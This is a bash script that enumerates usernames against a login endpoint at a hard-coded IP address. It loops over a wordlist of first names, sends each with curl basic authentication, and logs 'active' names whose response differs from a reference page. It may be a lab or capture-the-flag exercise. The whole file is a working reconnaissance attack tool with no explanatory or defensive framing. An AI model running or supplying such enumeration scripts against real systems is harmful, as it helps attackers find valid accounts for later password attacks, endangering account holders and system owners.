#!/bin/bash

list=~/facebook-firstnames.txt
URL=http://142.1.44.135:8000/login

touch ~/.html_page
touch ~/active_usernames.txt

echo; echo "-----------Starting Script----------------"; echo;

while IFS= read -r name; do
    echo "Checking for username: $name";
    username=`echo "$name" | tr -d \\n`;
    curl -u "$username:" "$URL" > ~/.html_page
    output=`diff ~/.html_page ~/ref_page.txt`;
    if [[ "$output" == "" ]]; then
        echo "username: $username DNE";
    else
        echo "$username" >> ~/active_usernames.txt;
        echo "username: $username is active!!!!!!!";
        echo; echo;
    fi
done < "$list"

echo; echo "------------Ending Script-------------------"; echo;
